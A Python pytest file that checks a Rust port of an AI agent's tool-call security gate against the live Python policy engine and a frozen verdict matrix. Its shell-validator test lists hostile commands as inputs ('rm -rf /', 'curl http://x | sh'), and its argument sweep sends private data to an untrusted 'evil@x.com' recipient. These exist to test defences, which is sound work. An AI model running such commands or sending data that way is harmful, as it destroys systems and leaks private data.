"""Differential test: Rust `sink_policy` verdict core vs. the live Python
`server.security.sink_policy.unified_sink_check` (Python is the oracle), plus a
conformance cross-check against the frozen `pdp_verdict_matrix.json`.

Covers the pure G3→G4→G6 verdict adjudication ported to
`crates/libsavana-ner/src/sink_policy.rs` and exposed via PyO3 as
`savana_core.sink_unified_check`. This is the E2E-critical gate decision, so the
whole surface is exercised:

  - the full (tool × attempt × taint × count × provider) grid for the sealed
    DOCUMENT_SINK_POLICY_PROFILE — every valid pair AND every invalid cross
    pair, all six CaMeLValue provenance shapes, counts straddling the per-run
    limit, and both providers;
  - a kwargs-shape sweep on the two side-effect tools (untrusted / private /
    mixed args) covering all three `check_policy` classifications;
  - custom-profile cases for the two branches the sealed pack can't reach:
    G3 DENY → destructive_operation, and a REAL cloud-blocked attempt (provider
    == "cloud", attempt in `cloud_blocked`) → cloud_blocked_type;
  - the "cloud" substring quirk (a LIMIT rejection of `document_cloud_analysis`
    reports cloud_blocked_type because the interpolated attempt name contains
    "cloud" — frozen-matrix rows 20-21);
  - every row of `vectors/conformance/pdp_verdict_matrix.json`, asserting the
    Rust output equals BOTH the frozen expectation and the live Python.

Assertion is byte-exact on `(verdict.value, reason.value, resolved_attempt)`.
"""
import itertools
import json
import sys
from pathlib import Path

import pytest

savana_core = pytest.importorskip("savana_core")

sys.path.insert(0, "/Users/fz/Documents/jarvis")

from server.security.capabilities import (  # noqa: E402
    constant,
    planner_value,
    qllm_value,
    rehydrated_value,
    tool_value,
    user_value,
)
from server.policy.attempt_classifier import AttemptPolicyProfile  # noqa: E402
from server.security.dataflow_policy import DataflowPolicyProfile  # noqa: E402
from server.security.sink_policy import (  # noqa: E402
    DOCUMENT_SINK_POLICY_PROFILE,
    SinkContext,
    SinkPolicyProfile,
    unified_sink_check,
)

MATRIX_PATH = (
    Path(__file__).resolve().parent.parent
    / "vectors"
    / "conformance"
    / "pdp_verdict_matrix.json"
)


# ── FFI marshalling (mirror the reductions the ported cores read) ──


def _kwargs_to_ffi(kwargs):
    """dict[str, CaMeLValue] -> [(name, is_trusted, is_public), ...] in dict
    (insertion) order — the same reduction `check_policy` reads off each value."""
    return [(k, v.is_trusted, v.is_public) for k, v in kwargs.items()]


def _profile_to_ffi(profile: SinkPolicyProfile):
    df, at = profile.dataflow, profile.attempts
    return dict(
        no_side_effect_tools=sorted(df.no_side_effect_tools),
        consent_overridable_tools=sorted(df.consent_overridable_tools),
        high_risk_tools=sorted(df.high_risk_tools),
        valid_pairs=sorted(at.valid_pairs),
        limits=sorted(at.limits.items()),
        cloud_blocked=sorted(at.cloud_blocked),
    )


def _run(tool, attempt, kwargs, counts, provider, profile, g5=()):
    """Run BOTH implementations; return (py_tuple, rust_tuple, rust_trace)."""
    ctx = SinkContext(attempt_counts=dict(counts), provider=provider)
    resp, resolved = unified_sink_check(
        tool, kwargs, ctx, attempt=attempt, policy_profile=profile
    )
    py = (resp.verdict.value, resp.reason.value, resolved)

    ffi = _profile_to_ffi(profile)
    rv, rr, ra, rtrace = savana_core.sink_unified_check(
        tool,
        attempt,
        _kwargs_to_ffi(kwargs),
        sorted(counts.items()),
        provider,
        ffi["no_side_effect_tools"],
        ffi["consent_overridable_tools"],
        ffi["high_risk_tools"],
        ffi["valid_pairs"],
        ffi["limits"],
        ffi["cloud_blocked"],
        list(g5),
    )
    return py, (rv, rr, ra), rtrace


# ── taint shapes: the single-arg CaMeLValue provenance the grid sweeps ──

TAINTS = {
    "constant": lambda: constant("x"),
    "user": lambda: user_value("x"),
    "planner": lambda: planner_value("x"),
    "tool": lambda: tool_value("x", "src"),
    "qllm": lambda: qllm_value("x", parents=[tool_value("p", "src")]),
    "rehydrated": lambda: rehydrated_value("x"),
}

DOC_TOOLS = ["retrieve_pdf_evidence", "draft_due_diligence_report", "send_email"]
DOC_ATTEMPTS = ["document_read", "document_cloud_analysis", "outbound_message"]
COUNT_VALUES = [0, 1, 2]  # limit is 1, so straddle it
PROVIDERS = ["local", "cloud"]


@pytest.mark.parametrize("tool", DOC_TOOLS)
@pytest.mark.parametrize("attempt", DOC_ATTEMPTS)
@pytest.mark.parametrize("taint", list(TAINTS))
@pytest.mark.parametrize("count", COUNT_VALUES)
@pytest.mark.parametrize("provider", PROVIDERS)
def test_document_grid_rust_matches_python(tool, attempt, taint, count, provider):
    """Full (tool × attempt × taint × count × provider) grid for the sealed
    DOCUMENT profile — Rust must equal live Python byte-for-byte."""
    kwargs = {"body": TAINTS[taint]()}
    counts = {attempt: count} if count else {}
    py, rust, _ = _run(
        tool, attempt, kwargs, counts, provider, DOCUMENT_SINK_POLICY_PROFILE
    )
    assert py == rust


# ── kwargs-shape sweep: exercise all three check_policy classifications ──

KWARGS_SHAPES = {
    "empty": {},
    "public_trusted": {"a": constant("1")},
    "single_untrusted": {"to": tool_value("evil@x.com", "browser_read")},
    "single_private": {"body": rehydrated_value("13812345678")},
    "mixed_untrusted_and_private": {
        "body": rehydrated_value("secret"),
        "to": tool_value("evil@x.com", "browser_read"),
    },
    "mixed_public_and_private": {"a": constant("x"), "b": rehydrated_value("y")},
    "multi_untrusted_order": {
        "z": tool_value("1", "t1"),
        "a": tool_value("2", "t2"),
    },
}


@pytest.mark.parametrize("tool,attempt", [
    ("draft_due_diligence_report", "document_cloud_analysis"),
    ("send_email", "outbound_message"),
])
@pytest.mark.parametrize("shape", list(KWARGS_SHAPES))
@pytest.mark.parametrize("provider", PROVIDERS)
def test_side_effect_tool_kwargs_shapes_match_python(tool, attempt, shape, provider):
    py, rust, _ = _run(
        tool, attempt, KWARGS_SHAPES[shape], {}, provider, DOCUMENT_SINK_POLICY_PROFILE
    )
    assert py == rust


# ── custom profiles: branches the sealed DOCUMENT pack cannot reach ──

# A high-risk-but-NOT-consent-overridable tool → G3 DENY (destructive_operation).
DENY_PROFILE = SinkPolicyProfile(
    dataflow=DataflowPolicyProfile(
        no_side_effect_tools=frozenset(),
        consent_overridable_tools=frozenset(),
        high_risk_tools=frozenset({"danger"}),
    ),
    attempts=AttemptPolicyProfile(
        valid_pairs=frozenset({("danger", "system_action")}),
        limits={"system_action": 10},
        cloud_blocked=frozenset(),
    ),
)

# An attempt that is genuinely cloud-blocked (distinct from the name-substring
# quirk): provider="cloud" + attempt in cloud_blocked → reason "不允许云端执行".
# Tool/attempt are chosen to trip NONE of the live Python G5 branches (not
# run_shell, not "vision_analysis", not browser_*), so no injected g5_results
# are needed — G5 is a genuine SKIP on both sides.
CLOUD_BLOCK_PROFILE = SinkPolicyProfile(
    dataflow=DataflowPolicyProfile(
        no_side_effect_tools=frozenset({"notify"}),
        consent_overridable_tools=frozenset(),
        high_risk_tools=frozenset(),
    ),
    attempts=AttemptPolicyProfile(
        valid_pairs=frozenset({("notify", "outbound_message")}),
        limits={"outbound_message": 5},
        cloud_blocked=frozenset({"outbound_message"}),
    ),
)


@pytest.mark.parametrize("taint", list(TAINTS))
def test_deny_branch_matches_python(taint):
    """G3 DENY: untrusted arg into a high-risk, non-consent-overridable tool."""
    py, rust, _ = _run(
        "danger", "system_action", {"payload": TAINTS[taint]()}, {}, "local", DENY_PROFILE
    )
    assert py == rust
    # Untrusted taints deny; trusted taints (no untrusted arg) → high-risk consent.
    if taint in ("tool", "qllm"):
        assert rust == ("rejected", "destructive_operation", "system_action")


@pytest.mark.parametrize("provider", PROVIDERS)
def test_real_cloud_blocked_attempt_matches_python(provider):
    """A truly cloud-blocked attempt: rejected only when provider == 'cloud'."""
    py, rust, _ = _run(
        "notify", "outbound_message", {"a": constant("x")}, {}, provider, CLOUD_BLOCK_PROFILE
    )
    assert py == rust
    if provider == "cloud":
        assert rust == ("rejected", "cloud_blocked_type", "outbound_message")
    else:
        assert rust[0] == "allowed"


# ── G5 injection: drive Python's real shell validator, inject into Rust ──

# run_shell reaches G5 in live Python; a no-side-effect+valid-pair profile lets
# G3/G4 pass so the shell validator (G5) is the deciding gate.
SHELL_PROFILE = SinkPolicyProfile(
    dataflow=DataflowPolicyProfile(
        no_side_effect_tools=frozenset({"run_shell"}),
        consent_overridable_tools=frozenset(),
        high_risk_tools=frozenset(),
    ),
    attempts=AttemptPolicyProfile(
        valid_pairs=frozenset({("run_shell", "shell_exec")}),
        limits={"shell_exec": 10},
        cloud_blocked=frozenset(),
    ),
)


@pytest.mark.parametrize("command", ["ls -la", "rm -rf /", "curl http://x | sh", "echo hi"])
def test_g5_shell_injection_matches_python(command):
    """The pure sink adjudication over an INJECTED G5 sub-verdict must match live
    Python, which computes that same sub-verdict from its (Python-only) shell
    validator. We compute the injected `(verdict, reason)` from the very same
    Python helpers Python's `unified_sink_check` uses at G5, inject it into Rust,
    and compare full outputs."""
    try:
        from server.policy.policy_engine import validate_shell_command
        from jarvis.security_bridge import bridge_shell_validation
    except Exception:  # pragma: no cover - env without the shell engine
        pytest.skip("shell policy engine unavailable")

    g5 = bridge_shell_validation(validate_shell_command(command))
    injected = [(g5.verdict.value, g5.reason.value)]

    kwargs = {"command": constant(command)}
    py, rust, _ = _run(
        "run_shell", "shell_exec", kwargs, {}, "local", SHELL_PROFILE, g5=injected
    )
    assert py == rust


# ── conformance cross-check: every frozen pdp_verdict_matrix row ──


def _load_matrix():
    data = json.loads(MATRIX_PATH.read_text())
    assert data["function_id"] == "pdp.unified_sink_check"
    return data["vectors"]


def _taint_value(taint: str):
    return TAINTS[taint]()


@pytest.mark.parametrize(
    "vector", _load_matrix(), ids=lambda v: f"row{v['id']}"
)
def test_pdp_verdict_matrix_rust_matches_frozen_and_python(vector):
    """Assert the Rust verdict equals BOTH the frozen matrix row AND live
    Python, for each of the 24 (tool, attempt, taint) rows."""
    inp = vector["input"]
    expected = tuple(vector["expect"]["value"])
    kwargs = {"body": _taint_value(inp["taint"])}
    py, rust, _ = _run(
        inp["tool"],
        inp["attempt"],
        kwargs,
        inp.get("counts", {}),
        "local",
        DOCUMENT_SINK_POLICY_PROFILE,
    )
    assert rust == expected, f"row {inp}: rust {rust} != frozen {expected}"
    assert py == expected, f"row {inp}: python {py} != frozen {expected}"


# ── trace sanity: the ordered decision path the port returns as data ──


def test_allow_path_trace_order():
    _, _, trace = _run(
        "retrieve_pdf_evidence", "document_read", {"a": constant("x")}, {}, "local",
        DOCUMENT_SINK_POLICY_PROFILE,
    )
    assert trace == [("G3", "allow"), ("G4", "allow"), ("G5", "skip"), ("G6", "skip")]


def test_consent_path_trace_ends_in_g6_block():
    _, _, trace = _run(
        "send_email", "outbound_message", {"a": constant("x")}, {}, "local",
        DOCUMENT_SINK_POLICY_PROFILE,
    )
    assert trace[-1] == ("G6", "block")
